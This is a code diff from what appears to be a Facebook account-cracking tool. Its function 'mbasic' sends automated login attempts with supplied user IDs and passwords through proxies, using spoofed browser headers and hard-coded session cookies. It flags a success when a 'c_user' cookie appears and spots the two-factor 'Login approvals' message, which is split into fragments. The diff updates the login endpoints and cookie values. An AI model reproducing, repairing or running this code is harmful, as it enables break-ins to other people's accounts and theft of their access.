@@ -1248,21 +1248,20 @@ def mbasic(uid,pwx,tl):
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnS132.AWWwafGKWUY',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTf6U.AWVjAAYSqfA',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
             'wd': '1440x402',
             'ps_l': '1',
-            'ps_n': '1',
-            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNuczFldjF2YXZ1bHYiLCJ0aW1lIjoxNzMyOTkyMjk1fQ^%^3D^%^3D',}
+            'ps_n': '1',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Referer': 'https://web.facebook.com/',
+            'Referer': 'https://www.facebook.com/',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://web.facebook.com',
+            'Origin': 'https://www.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'web.facebook.com',
+            'Alt-Used': 'www.facebook.com',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
@@ -1273,7 +1272,7 @@ def mbasic(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            url = 'https://www.facebook.com/login/?'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
